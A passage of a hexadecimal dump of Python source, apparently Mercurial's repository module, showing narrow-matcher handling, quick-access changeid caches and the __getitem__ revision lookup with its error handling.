+0000f9d0: 742c 2069 6e63 6c75 6465 3d69 6e63 6c75  t, include=inclu
+0000f9e0: 6465 2c20 6578 636c 7564 653d 6578 636c  de, exclude=excl
+0000f9f0: 7564 6529 0a0a 2020 2020 6465 6620 6e61  ude)..    def na
+0000fa00: 7272 6f77 6d61 7463 6828 7365 6c66 2c20  rrowmatch(self, 
+0000fa10: 6d61 7463 683d 4e6f 6e65 2c20 696e 636c  match=None, incl
+0000fa20: 7564 6565 7861 6374 3d46 616c 7365 293a  udeexact=False):
+0000fa30: 0a20 2020 2020 2020 2022 2222 6d61 7463  .        """matc
+0000fa40: 6865 7220 636f 7272 6573 706f 6e64 696e  her correspondin
+0000fa50: 6720 7468 6520 7468 6520 7265 706f 2773  g the the repo's
+0000fa60: 206e 6172 726f 7773 7065 630a 0a20 2020   narrowspec..   
+0000fa70: 2020 2020 2049 6620 606d 6174 6368 6020       If `match` 
+0000fa80: 6973 2067 6976 656e 2c20 7468 656e 2074  is given, then t
+0000fa90: 6861 7420 7769 6c6c 2062 6520 696e 7465  hat will be inte
+0000faa0: 7273 6563 7465 6420 7769 7468 2074 6865  rsected with the
+0000fab0: 206e 6172 726f 770a 2020 2020 2020 2020   narrow.        
+0000fac0: 6d61 7463 6865 722e 0a0a 2020 2020 2020  matcher...      
+0000fad0: 2020 4966 2060 696e 636c 7564 6565 7861    If `includeexa
+0000fae0: 6374 6020 6973 2054 7275 652c 2074 6865  ct` is True, the
+0000faf0: 6e20 616e 7920 6578 6163 7420 6d61 7463  n any exact matc
+0000fb00: 6865 7320 6672 6f6d 2060 6d61 7463 6860  hes from `match`
+0000fb10: 2077 696c 6c0a 2020 2020 2020 2020 6265   will.        be
+0000fb20: 2069 6e63 6c75 6465 6420 6576 656e 2069   included even i
+0000fb30: 6620 7468 6579 2772 6520 6f75 7473 6964  f they're outsid
+0000fb40: 6520 7468 6520 6e61 7272 6f77 7370 6563  e the narrowspec
+0000fb50: 2e0a 2020 2020 2020 2020 2222 220a 2020  ..        """.  
+0000fb60: 2020 2020 2020 6966 206d 6174 6368 3a0a        if match:.
+0000fb70: 2020 2020 2020 2020 2020 2020 6966 2069              if i
+0000fb80: 6e63 6c75 6465 6578 6163 7420 616e 6420  ncludeexact and 
+0000fb90: 6e6f 7420 7365 6c66 2e5f 6e61 7272 6f77  not self._narrow
+0000fba0: 6d61 7463 682e 616c 7761 7973 2829 3a0a  match.always():.
+0000fbb0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+0000fbc0: 2320 646f 206e 6f74 2065 7863 6c75 6465  # do not exclude
+0000fbd0: 2065 7870 6c69 6369 746c 792d 7370 6563   explicitly-spec
+0000fbe0: 6966 6965 6420 7061 7468 7320 736f 2074  ified paths so t
+0000fbf0: 6861 7420 7468 6579 2063 616e 0a20 2020  hat they can.   
+0000fc00: 2020 2020 2020 2020 2020 2020 2023 2062               # b
+0000fc10: 6520 7761 726e 6564 206c 6174 6572 206f  e warned later o
+0000fc20: 6e0a 2020 2020 2020 2020 2020 2020 2020  n.              
+0000fc30: 2020 656d 203d 206d 6174 6368 6d6f 642e    em = matchmod.
+0000fc40: 6578 6163 7428 6d61 7463 682e 6669 6c65  exact(match.file
+0000fc50: 7328 2929 0a20 2020 2020 2020 2020 2020  s()).           
+0000fc60: 2020 2020 206e 6d20 3d20 6d61 7463 686d       nm = matchm
+0000fc70: 6f64 2e75 6e69 6f6e 6d61 7463 6865 7228  od.unionmatcher(
+0000fc80: 5b73 656c 662e 5f6e 6172 726f 776d 6174  [self._narrowmat
+0000fc90: 6368 2c20 656d 5d29 0a20 2020 2020 2020  ch, em]).       
+0000fca0: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
+0000fcb0: 6d61 7463 686d 6f64 2e69 6e74 6572 7365  matchmod.interse
+0000fcc0: 6374 6d61 7463 6865 7273 286d 6174 6368  ctmatchers(match
+0000fcd0: 2c20 6e6d 290a 2020 2020 2020 2020 2020  , nm).          
+0000fce0: 2020 7265 7475 726e 206d 6174 6368 6d6f    return matchmo
+0000fcf0: 642e 696e 7465 7273 6563 746d 6174 6368  d.intersectmatch
+0000fd00: 6572 7328 6d61 7463 682c 2073 656c 662e  ers(match, self.
+0000fd10: 5f6e 6172 726f 776d 6174 6368 290a 2020  _narrowmatch).  
+0000fd20: 2020 2020 2020 7265 7475 726e 2073 656c        return sel
+0000fd30: 662e 5f6e 6172 726f 776d 6174 6368 0a0a  f._narrowmatch..
+0000fd40: 2020 2020 6465 6620 7365 746e 6172 726f      def setnarro
+0000fd50: 7770 6174 7328 7365 6c66 2c20 6e65 7769  wpats(self, newi
+0000fd60: 6e63 6c75 6465 732c 206e 6577 6578 636c  ncludes, newexcl
+0000fd70: 7564 6573 293a 0a20 2020 2020 2020 206e  udes):.        n
+0000fd80: 6172 726f 7773 7065 632e 7361 7665 2873  arrowspec.save(s
+0000fd90: 656c 662c 206e 6577 696e 636c 7564 6573  elf, newincludes
+0000fda0: 2c20 6e65 7765 7863 6c75 6465 7329 0a20  , newexcludes). 
+0000fdb0: 2020 2020 2020 2073 656c 662e 696e 7661         self.inva
+0000fdc0: 6c69 6461 7465 2863 6c65 6172 6669 6c65  lidate(clearfile
+0000fdd0: 6361 6368 653d 5472 7565 290a 0a20 2020  cache=True)..   
+0000fde0: 2040 756e 6669 6c74 6572 6564 7072 6f70   @unfilteredprop
+0000fdf0: 6572 7479 6361 6368 650a 2020 2020 6465  ertycache.    de
+0000fe00: 6620 5f71 7569 636b 5f61 6363 6573 735f  f _quick_access_
+0000fe10: 6368 616e 6765 6964 5f6e 756c 6c28 7365  changeid_null(se
+0000fe20: 6c66 293a 0a20 2020 2020 2020 2072 6574  lf):.        ret
+0000fe30: 7572 6e20 7b0a 2020 2020 2020 2020 2020  urn {.          
+0000fe40: 2020 6227 6e75 6c6c 273a 2028 6e75 6c6c    b'null': (null
+0000fe50: 7265 762c 2073 656c 662e 6e6f 6465 636f  rev, self.nodeco
+0000fe60: 6e73 7461 6e74 732e 6e75 6c6c 6964 292c  nstants.nullid),
+0000fe70: 0a20 2020 2020 2020 2020 2020 206e 756c  .            nul
+0000fe80: 6c72 6576 3a20 286e 756c 6c72 6576 2c20  lrev: (nullrev, 
+0000fe90: 7365 6c66 2e6e 6f64 6563 6f6e 7374 616e  self.nodeconstan
+0000fea0: 7473 2e6e 756c 6c69 6429 2c0a 2020 2020  ts.nullid),.    
+0000feb0: 2020 2020 2020 2020 7365 6c66 2e6e 756c          self.nul
+0000fec0: 6c69 643a 2028 6e75 6c6c 7265 762c 2073  lid: (nullrev, s
+0000fed0: 656c 662e 6e75 6c6c 6964 292c 0a20 2020  elf.nullid),.   
+0000fee0: 2020 2020 207d 0a0a 2020 2020 4075 6e66       }..    @unf
+0000fef0: 696c 7465 7265 6470 726f 7065 7274 7963  ilteredpropertyc
+0000ff00: 6163 6865 0a20 2020 2064 6566 205f 7175  ache.    def _qu
+0000ff10: 6963 6b5f 6163 6365 7373 5f63 6861 6e67  ick_access_chang
+0000ff20: 6569 645f 7763 2873 656c 6629 3a0a 2020  eid_wc(self):.  
+0000ff30: 2020 2020 2020 2320 616c 736f 2066 6173        # also fas
+0000ff40: 7420 7061 7468 2061 6363 6573 7320 746f  t path access to
+0000ff50: 2074 6865 2077 6f72 6b69 6e67 2063 6f70   the working cop
+0000ff60: 7920 7061 7265 6e74 730a 2020 2020 2020  y parents.      
+0000ff70: 2020 2320 686f 7765 7665 722c 206f 6e6c    # however, onl
+0000ff80: 7920 646f 2069 7420 666f 7220 6669 6c74  y do it for filt
+0000ff90: 6572 2074 6861 7420 656e 7375 7265 2077  er that ensure w
+0000ffa0: 6320 6973 2076 6973 6962 6c65 2e0a 2020  c is visible..  
+0000ffb0: 2020 2020 2020 7175 6963 6b20 3d20 7365        quick = se
+0000ffc0: 6c66 2e5f 7175 6963 6b5f 6163 6365 7373  lf._quick_access
+0000ffd0: 5f63 6861 6e67 6569 645f 6e75 6c6c 2e63  _changeid_null.c
+0000ffe0: 6f70 7928 290a 2020 2020 2020 2020 636c  opy().        cl
+0000fff0: 203d 2073 656c 662e 756e 6669 6c74 6572   = self.unfilter
+00010000: 6564 2829 2e63 6861 6e67 656c 6f67 0a20  ed().changelog. 
+00010010: 2020 2020 2020 2066 6f72 206e 6f64 6520         for node 
+00010020: 696e 2073 656c 662e 6469 7273 7461 7465  in self.dirstate
+00010030: 2e70 6172 656e 7473 2829 3a0a 2020 2020  .parents():.    
+00010040: 2020 2020 2020 2020 6966 206e 6f64 6520          if node 
+00010050: 3d3d 2073 656c 662e 6e75 6c6c 6964 3a0a  == self.nullid:.
+00010060: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010070: 636f 6e74 696e 7565 0a20 2020 2020 2020  continue.       
+00010080: 2020 2020 2072 6576 203d 2063 6c2e 696e       rev = cl.in
+00010090: 6465 782e 6765 745f 7265 7628 6e6f 6465  dex.get_rev(node
+000100a0: 290a 2020 2020 2020 2020 2020 2020 6966  ).            if
+000100b0: 2072 6576 2069 7320 4e6f 6e65 3a0a 2020   rev is None:.  
+000100c0: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+000100d0: 756e 6b6e 6f77 6e20 776f 726b 696e 6720  unknown working 
+000100e0: 636f 7079 2070 6172 656e 7420 6361 7365  copy parent case
+000100f0: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+00010100: 2020 230a 2020 2020 2020 2020 2020 2020    #.            
+00010110: 2020 2020 2320 2020 736b 6970 2074 6865      #   skip the
+00010120: 2066 6173 7420 7061 7468 2061 6e64 206c   fast path and l
+00010130: 6574 2068 6967 6865 7220 636f 6465 2064  et higher code d
+00010140: 6561 6c20 7769 7468 2069 740a 2020 2020  eal with it.    
+00010150: 2020 2020 2020 2020 2020 2020 636f 6e74              cont
+00010160: 696e 7565 0a20 2020 2020 2020 2020 2020  inue.           
+00010170: 2070 6169 7220 3d20 2872 6576 2c20 6e6f   pair = (rev, no
+00010180: 6465 290a 2020 2020 2020 2020 2020 2020  de).            
+00010190: 7175 6963 6b5b 7265 765d 203d 2070 6169  quick[rev] = pai
+000101a0: 720a 2020 2020 2020 2020 2020 2020 7175  r.            qu
+000101b0: 6963 6b5b 6e6f 6465 5d20 3d20 7061 6972  ick[node] = pair
+000101c0: 0a20 2020 2020 2020 2020 2020 2023 2061  .            # a
+000101d0: 6c73 6f20 6164 6420 7468 6520 7061 7265  lso add the pare
+000101e0: 6e74 7320 6f66 2074 6865 2070 6172 656e  nts of the paren
+000101f0: 7473 0a20 2020 2020 2020 2020 2020 2066  ts.            f
+00010200: 6f72 2072 2069 6e20 636c 2e70 6172 656e  or r in cl.paren
+00010210: 7472 6576 7328 7265 7629 3a0a 2020 2020  trevs(rev):.    
+00010220: 2020 2020 2020 2020 2020 2020 6966 2072              if r
+00010230: 203d 3d20 6e75 6c6c 7265 763a 0a20 2020   == nullrev:.   
+00010240: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010250: 2063 6f6e 7469 6e75 650a 2020 2020 2020   continue.      
+00010260: 2020 2020 2020 2020 2020 6e20 3d20 636c            n = cl
+00010270: 2e6e 6f64 6528 7229 0a20 2020 2020 2020  .node(r).       
+00010280: 2020 2020 2020 2020 2070 6169 7220 3d20           pair = 
+00010290: 2872 2c20 6e29 0a20 2020 2020 2020 2020  (r, n).         
+000102a0: 2020 2020 2020 2071 7569 636b 5b72 5d20         quick[r] 
+000102b0: 3d20 7061 6972 0a20 2020 2020 2020 2020  = pair.         
+000102c0: 2020 2020 2020 2071 7569 636b 5b6e 5d20         quick[n] 
+000102d0: 3d20 7061 6972 0a20 2020 2020 2020 2070  = pair.        p
+000102e0: 316e 6f64 6520 3d20 7365 6c66 2e64 6972  1node = self.dir
+000102f0: 7374 6174 652e 7031 2829 0a20 2020 2020  state.p1().     
+00010300: 2020 2069 6620 7031 6e6f 6465 2021 3d20     if p1node != 
+00010310: 7365 6c66 2e6e 756c 6c69 643a 0a20 2020  self.nullid:.   
+00010320: 2020 2020 2020 2020 2071 7569 636b 5b62           quick[b
+00010330: 272e 275d 203d 2071 7569 636b 5b70 316e  '.'] = quick[p1n
+00010340: 6f64 655d 0a20 2020 2020 2020 2072 6574  ode].        ret
+00010350: 7572 6e20 7175 6963 6b0a 0a20 2020 2040  urn quick..    @
+00010360: 756e 6669 6c74 6572 6564 6d65 7468 6f64  unfilteredmethod
+00010370: 0a20 2020 2064 6566 205f 7175 6963 6b5f  .    def _quick_
+00010380: 6163 6365 7373 5f63 6861 6e67 6569 645f  access_changeid_
+00010390: 696e 7661 6c69 6461 7465 2873 656c 6629  invalidate(self)
+000103a0: 3a0a 2020 2020 2020 2020 6966 2027 5f71  :.        if '_q
+000103b0: 7569 636b 5f61 6363 6573 735f 6368 616e  uick_access_chan
+000103c0: 6765 6964 5f77 6327 2069 6e20 7661 7273  geid_wc' in vars
+000103d0: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
+000103e0: 2020 2020 6465 6c20 7365 6c66 2e5f 5f64      del self.__d
+000103f0: 6963 745f 5f5b 275f 7175 6963 6b5f 6163  ict__['_quick_ac
+00010400: 6365 7373 5f63 6861 6e67 6569 645f 7763  cess_changeid_wc
+00010410: 275d 0a0a 2020 2020 4070 726f 7065 7274  ']..    @propert
+00010420: 790a 2020 2020 6465 6620 5f71 7569 636b  y.    def _quick
+00010430: 5f61 6363 6573 735f 6368 616e 6765 6964  _access_changeid
+00010440: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
+00010450: 2222 2261 6e20 6865 6c70 6572 2064 6963  """an helper dic
+00010460: 7469 6f6e 6e61 7279 2066 6f72 205f 5f67  tionnary for __g
+00010470: 6574 6974 656d 5f5f 2063 616c 6c73 0a0a  etitem__ calls..
+00010480: 2020 2020 2020 2020 5468 6973 2063 6f6e          This con
+00010490: 7461 696e 7320 6120 6c69 7374 206f 6620  tains a list of 
+000104a0: 7379 6d62 6f6c 2077 6520 6361 6e20 7265  symbol we can re
+000104b0: 636f 676e 6973 6520 7269 6768 7420 6177  cognise right aw
+000104c0: 6179 2077 6974 686f 7574 0a20 2020 2020  ay without.     
+000104d0: 2020 2066 7572 7468 6572 2070 726f 6365     further proce
+000104e0: 7373 696e 672e 0a20 2020 2020 2020 2022  ssing..        "
+000104f0: 2222 0a20 2020 2020 2020 2069 6620 7365  "".        if se
+00010500: 6c66 2e66 696c 7465 726e 616d 6520 696e  lf.filtername in
+00010510: 2072 6570 6f76 6965 772e 6669 6c74 6572   repoview.filter
+00010520: 5f68 6173 5f77 633a 0a20 2020 2020 2020  _has_wc:.       
+00010530: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
+00010540: 2e5f 7175 6963 6b5f 6163 6365 7373 5f63  ._quick_access_c
+00010550: 6861 6e67 6569 645f 7763 0a20 2020 2020  hangeid_wc.     
+00010560: 2020 2072 6574 7572 6e20 7365 6c66 2e5f     return self._
+00010570: 7175 6963 6b5f 6163 6365 7373 5f63 6861  quick_access_cha
+00010580: 6e67 6569 645f 6e75 6c6c 0a0a 2020 2020  ngeid_null..    
+00010590: 6465 6620 5f5f 6765 7469 7465 6d5f 5f28  def __getitem__(
+000105a0: 7365 6c66 2c20 6368 616e 6765 6964 293a  self, changeid):
+000105b0: 0a20 2020 2020 2020 2023 2064 6561 6c69  .        # deali
+000105c0: 6e67 2077 6974 6820 7370 6563 6961 6c20  ng with special 
+000105d0: 6361 7365 730a 2020 2020 2020 2020 6966  cases.        if
+000105e0: 2063 6861 6e67 6569 6420 6973 204e 6f6e   changeid is Non
+000105f0: 653a 0a20 2020 2020 2020 2020 2020 2072  e:.            r
+00010600: 6574 7572 6e20 636f 6e74 6578 742e 776f  eturn context.wo
+00010610: 726b 696e 6763 7478 2873 656c 6629 0a20  rkingctx(self). 
+00010620: 2020 2020 2020 2069 6620 6973 696e 7374         if isinst
+00010630: 616e 6365 2863 6861 6e67 6569 642c 2063  ance(changeid, c
+00010640: 6f6e 7465 7874 2e62 6173 6563 7478 293a  ontext.basectx):
+00010650: 0a20 2020 2020 2020 2020 2020 2072 6574  .            ret
+00010660: 7572 6e20 6368 616e 6765 6964 0a0a 2020  urn changeid..  
+00010670: 2020 2020 2020 2320 6465 616c 696e 6720        # dealing 
+00010680: 7769 7468 206d 756c 7469 706c 6520 7265  with multiple re
+00010690: 7669 7369 6f6e 730a 2020 2020 2020 2020  visions.        
+000106a0: 6966 2069 7369 6e73 7461 6e63 6528 6368  if isinstance(ch
+000106b0: 616e 6765 6964 2c20 736c 6963 6529 3a0a  angeid, slice):.
+000106c0: 2020 2020 2020 2020 2020 2020 2320 7764              # wd
+000106d0: 6972 7265 7620 6973 6e27 7420 636f 6e74  irrev isn't cont
+000106e0: 6967 756f 7573 2073 6f20 7468 6520 736c  iguous so the sl
+000106f0: 6963 6520 7368 6f75 6c64 6e27 7420 696e  ice shouldn't in
+00010700: 636c 7564 6520 6974 0a20 2020 2020 2020  clude it.       
+00010710: 2020 2020 2072 6574 7572 6e20 5b0a 2020       return [.  
+00010720: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00010730: 6c66 5b69 5d0a 2020 2020 2020 2020 2020  lf[i].          
+00010740: 2020 2020 2020 666f 7220 6920 696e 2072        for i in r
+00010750: 616e 6765 282a 6368 616e 6765 6964 2e69  ange(*changeid.i
+00010760: 6e64 6963 6573 286c 656e 2873 656c 6629  ndices(len(self)
+00010770: 2929 0a20 2020 2020 2020 2020 2020 2020  )).             
+00010780: 2020 2069 6620 6920 6e6f 7420 696e 2073     if i not in s
+00010790: 656c 662e 6368 616e 6765 6c6f 672e 6669  elf.changelog.fi
+000107a0: 6c74 6572 6564 7265 7673 0a20 2020 2020  lteredrevs.     
+000107b0: 2020 2020 2020 205d 0a0a 2020 2020 2020         ]..      
+000107c0: 2020 2320 6465 616c 696e 6720 7769 7468    # dealing with
+000107d0: 2073 6f6d 6520 7370 6563 6961 6c20 7661   some special va
+000107e0: 6c75 6573 0a20 2020 2020 2020 2071 7569  lues.        qui
+000107f0: 636b 5f61 6363 6573 7320 3d20 7365 6c66  ck_access = self
+00010800: 2e5f 7175 6963 6b5f 6163 6365 7373 5f63  ._quick_access_c
+00010810: 6861 6e67 6569 642e 6765 7428 6368 616e  hangeid.get(chan
+00010820: 6765 6964 290a 2020 2020 2020 2020 6966  geid).        if
+00010830: 2071 7569 636b 5f61 6363 6573 7320 6973   quick_access is
+00010840: 206e 6f74 204e 6f6e 653a 0a20 2020 2020   not None:.     
+00010850: 2020 2020 2020 2072 6576 2c20 6e6f 6465         rev, node
+00010860: 203d 2071 7569 636b 5f61 6363 6573 730a   = quick_access.
+00010870: 2020 2020 2020 2020 2020 2020 7265 7475              retu
+00010880: 726e 2063 6f6e 7465 7874 2e63 6861 6e67  rn context.chang
+00010890: 6563 7478 2873 656c 662c 2072 6576 2c20  ectx(self, rev, 
+000108a0: 6e6f 6465 2c20 6d61 7962 655f 6669 6c74  node, maybe_filt
+000108b0: 6572 6564 3d46 616c 7365 290a 2020 2020  ered=False).    
+000108c0: 2020 2020 6966 2063 6861 6e67 6569 6420      if changeid 
+000108d0: 3d3d 2062 2774 6970 273a 0a20 2020 2020  == b'tip':.     
+000108e0: 2020 2020 2020 206e 6f64 6520 3d20 7365         node = se
+000108f0: 6c66 2e63 6861 6e67 656c 6f67 2e74 6970  lf.changelog.tip
+00010900: 2829 0a20 2020 2020 2020 2020 2020 2072  ().            r
+00010910: 6576 203d 2073 656c 662e 6368 616e 6765  ev = self.change
+00010920: 6c6f 672e 7265 7628 6e6f 6465 290a 2020  log.rev(node).  
+00010930: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00010940: 2063 6f6e 7465 7874 2e63 6861 6e67 6563   context.changec
+00010950: 7478 2873 656c 662c 2072 6576 2c20 6e6f  tx(self, rev, no
+00010960: 6465 290a 0a20 2020 2020 2020 2023 2064  de)..        # d
+00010970: 6561 6c69 6e67 2077 6974 6820 6172 6269  ealing with arbi
+00010980: 7472 6172 7920 7661 6c75 6573 0a20 2020  trary values.   
+00010990: 2020 2020 2074 7279 3a0a 2020 2020 2020       try:.      
+000109a0: 2020 2020 2020 6966 2069 7369 6e73 7461        if isinsta
+000109b0: 6e63 6528 6368 616e 6765 6964 2c20 696e  nce(changeid, in
+000109c0: 7429 3a0a 2020 2020 2020 2020 2020 2020  t):.            
+000109d0: 2020 2020 6e6f 6465 203d 2073 656c 662e      node = self.
+000109e0: 6368 616e 6765 6c6f 672e 6e6f 6465 2863  changelog.node(c
+000109f0: 6861 6e67 6569 6429 0a20 2020 2020 2020  hangeid).       
+00010a00: 2020 2020 2020 2020 2072 6576 203d 2063           rev = c
+00010a10: 6861 6e67 6569 640a 2020 2020 2020 2020  hangeid.        
+00010a20: 2020 2020 656c 6966 2063 6861 6e67 6569      elif changei
+00010a30: 6420 3d3d 2062 272e 273a 0a20 2020 2020  d == b'.':.     
+00010a40: 2020 2020 2020 2020 2020 2023 2074 6869             # thi
+00010a50: 7320 6973 2061 2068 6163 6b20 746f 2064  s is a hack to d
+00010a60: 656c 6179 2f61 766f 6964 206c 6f61 6469  elay/avoid loadi
+00010a70: 6e67 206f 6273 6d61 726b 6572 730a 2020  ng obsmarkers.  
+00010a80: 2020 2020 2020 2020 2020 2020 2020 2320                # 
+00010a90: 7768 656e 2077 6520 6b6e 6f77 2074 6861  when we know tha
+00010aa0: 7420 272e 2720 776f 6e27 7420 6265 2068  t '.' won't be h
+00010ab0: 6964 6465 6e0a 2020 2020 2020 2020 2020  idden.          
+00010ac0: 2020 2020 2020 6e6f 6465 203d 2073 656c        node = sel
+00010ad0: 662e 6469 7273 7461 7465 2e70 3128 290a  f.dirstate.p1().
+00010ae0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010af0: 7265 7620 3d20 7365 6c66 2e75 6e66 696c  rev = self.unfil
+00010b00: 7465 7265 6428 292e 6368 616e 6765 6c6f  tered().changelo
+00010b10: 672e 7265 7628 6e6f 6465 290a 2020 2020  g.rev(node).    
+00010b20: 2020 2020 2020 2020 656c 6966 206c 656e          elif len
+00010b30: 2863 6861 6e67 6569 6429 203d 3d20 7365  (changeid) == se
+00010b40: 6c66 2e6e 6f64 6563 6f6e 7374 616e 7473  lf.nodeconstants
+00010b50: 2e6e 6f64 656c 656e 3a0a 2020 2020 2020  .nodelen:.      
+00010b60: 2020 2020 2020 2020 2020 7472 793a 0a20            try:. 
+00010b70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010b80: 2020 206e 6f64 6520 3d20 6368 616e 6765     node = change
+00010b90: 6964 0a20 2020 2020 2020 2020 2020 2020  id.             
+00010ba0: 2020 2020 2020 2072 6576 203d 2073 656c         rev = sel
+00010bb0: 662e 6368 616e 6765 6c6f 672e 7265 7628  f.changelog.rev(
+00010bc0: 6368 616e 6765 6964 290a 2020 2020 2020  changeid).      
+00010bd0: 2020 2020 2020 2020 2020 6578 6365 7074            except
+00010be0: 2065 7272 6f72 2e46 696c 7465 7265 644c   error.FilteredL
+00010bf0: 6f6f 6b75 7045 7272 6f72 3a0a 2020 2020  ookupError:.    
+00010c00: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010c10: 6368 616e 6765 6964 203d 2068 6578 2863  changeid = hex(c
+00010c20: 6861 6e67 6569 6429 2020 2320 666f 7220  hangeid)  # for 
+00010c30: 7468 6520 6572 726f 7220 6d65 7373 6167  the error messag
+00010c40: 650a 2020 2020 2020 2020 2020 2020 2020  e.              
+00010c50: 2020 2020 2020 7261 6973 650a 2020 2020        raise.    
+00010c60: 2020 2020 2020 2020 2020 2020 6578 6365              exce
+00010c70: 7074 204c 6f6f 6b75 7045 7272 6f72 3a0a  pt LookupError:.
+00010c80: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010c90: 2020 2020 2320 6368 6563 6b20 6966 2069      # check if i
+00010ca0: 7420 6d69 6768 7420 6861 7665 2063 6f6d  t might have com
+00010cb0: 6520 6672 6f6d 2064 616d 6167 6564 2064  e from damaged d
+00010cc0: 6972 7374 6174 650a 2020 2020 2020 2020  irstate.        
+00010cd0: 2020 2020 2020 2020 2020 2020 230a 2020              #.  
+00010ce0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010cf0: 2020 2320 5858 5820 7765 2063 6f75 6c64    # XXX we could
+00010d00: 2061 766f 6964 2074 6865 2075 6e66 696c   avoid the unfil
+00010d10: 7465 7265 6420 6966 2077 6520 6861 6420  tered if we had 
+00010d20: 6120 7265 636f 676e 697a 6162 6c65 0a20  a recognizable. 
+00010d30: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010d40: 2020 2023 2065 7863 6570 7469 6f6e 2066     # exception f
+00010d50: 6f72 2066 696c 7465 7265 6420 6368 616e  or filtered chan
+00010d60: 6765 7365 7420 6163 6365 7373 0a20 2020  geset access.   
+00010d70: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010d80: 2069 6620 280a 2020 2020 2020 2020 2020   if (.          
+00010d90: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00010da0: 6c66 2e6c 6f63 616c 2829 0a20 2020 2020  lf.local().     
+00010db0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010dc0: 2020 2061 6e64 2063 6861 6e67 6569 6420     and changeid 
+00010dd0: 696e 2073 656c 662e 756e 6669 6c74 6572  in self.unfilter
+00010de0: 6564 2829 2e64 6972 7374 6174 652e 7061  ed().dirstate.pa
+00010df0: 7265 6e74 7328 290a 2020 2020 2020 2020  rents().        
+00010e00: 2020 2020 2020 2020 2020 2020 293a 0a20              ):. 
+00010e10: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010e20: 2020 2020 2020 206d 7367 203d 205f 2862         msg = _(b
+00010e30: 2277 6f72 6b69 6e67 2064 6972 6563 746f  "working directo
+00010e40: 7279 2068 6173 2075 6e6b 6e6f 776e 2070  ry has unknown p
+00010e50: 6172 656e 7420 2725 7327 2122 290a 2020  arent '%s'!").  
+00010e60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010e70: 2020 2020 2020 7261 6973 6520 6572 726f        raise erro
+00010e80: 722e 4162 6f72 7428 6d73 6720 2520 7368  r.Abort(msg % sh
+00010e90: 6f72 7428 6368 616e 6765 6964 2929 0a20  ort(changeid)). 
+00010ea0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00010eb0: 2020 2063 6861 6e67 6569 6420 3d20 6865     changeid = he
+00010ec0: 7828 6368 616e 6765 6964 2920 2023 2066  x(changeid)  # f
+00010ed0: 6f72 2074 6865 2065 7272 6f72 206d 6573  or the error mes
+00010ee0: 7361 6765 0a20 2020 2020 2020 2020 2020  sage.           
+00010ef0: 2020 2020 2020 2020 2072 6169 7365 0a0a           raise..
+00010f00: 2020 2020 2020 2020 2020 2020 656c 6966              elif
+00010f10: 206c 656e 2863 6861 6e67 6569 6429 203d   len(changeid) =
+00010f20: 3d20 3220 2a20 7365 6c66 2e6e 6f64 6563  = 2 * self.nodec
+00010f30: 6f6e 7374 616e 7473 2e6e 6f64 656c 656e  onstants.nodelen
+00010f40: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
+00010f50: 2020 6e6f 6465 203d 2062 696e 2863 6861    node = bin(cha
+00010f60: 6e67 6569 6429 0a20 2020 2020 2020 2020  ngeid).         
+00010f70: 2020 2020 2020 2072 6576 203d 2073 656c         rev = sel
+00010f80: 662e 6368 616e 6765 6c6f 672e 7265 7628  f.changelog.rev(
+00010f90: 6e6f 6465 290a 2020 2020 2020 2020 2020  node).          
+00010fa0: 2020 656c 7365 3a0a 2020 2020 2020 2020    else:.        
+00010fb0: 2020 2020 2020 2020 7261 6973 6520 6572          raise er
+00010fc0: 726f 722e 5072 6f67 7261 6d6d 696e 6745  ror.ProgrammingE
+00010fd0: 7272 6f72 280a 2020 2020 2020 2020 2020  rror(.          
+00010fe0: 2020 2020 2020 2020 2020 6222 756e 7375            b"unsu
+00010ff0: 7070 6f72 7465 6420 6368 616e 6765 6964  pported changeid
+00011000: 2027 2573 2720 6f66 2074 7970 6520 2573   '%s' of type %s
+00011010: 220a 2020 2020 2020 2020 2020 2020 2020  ".              
+00011020: 2020 2020 2020 2520 2863 6861 6e67 6569        % (changei
+00011030: 642c 2070 7963 6f6d 7061 742e 6279 7465  d, pycompat.byte
+00011040: 7374 7228 7479 7065 2863 6861 6e67 6569  str(type(changei
+00011050: 6429 2929 0a20 2020 2020 2020 2020 2020  d))).           
+00011060: 2020 2020 2029 0a0a 2020 2020 2020 2020       )..        
+00011070: 2020 2020 7265 7475 726e 2063 6f6e 7465      return conte
+00011080: 7874 2e63 6861 6e67 6563 7478 2873 656c  xt.changectx(sel
+00011090: 662c 2072 6576 2c20 6e6f 6465 290a 0a20  f, rev, node).. 
+000110a0: 2020 2020 2020 2065 7863 6570 7420 2865         except (e
+000110b0: 7272 6f72 2e46 696c 7465 7265 6449 6e64  rror.FilteredInd
+000110c0: 6578 4572 726f 722c 2065 7272 6f72 2e46  exError, error.F
+000110d0: 696c 7465 7265 644c 6f6f 6b75 7045 7272  ilteredLookupErr
+000110e0: 6f72 293a 0a20 2020 2020 2020 2020 2020  or):.           
+000110f0: 2072 6169 7365 2065 7272 6f72 2e46 696c   raise error.Fil
+00011100: 7465 7265 6452 6570 6f4c 6f6f 6b75 7045  teredRepoLookupE
+00011110: 7272 6f72 280a 2020 2020 2020 2020 2020  rror(.          
+00011120: 2020 2020 2020 5f28 6222 6669 6c74 6572        _(b"filter
+00011130: 6564 2072 6576 6973 696f 6e20 2725 7327  ed revision '%s'
+00011140: 2229 2025 2070 7963 6f6d 7061 742e 6279  ") % pycompat.by
+00011150: 7465 7374 7228 6368 616e 6765 6964 290a  testr(changeid).
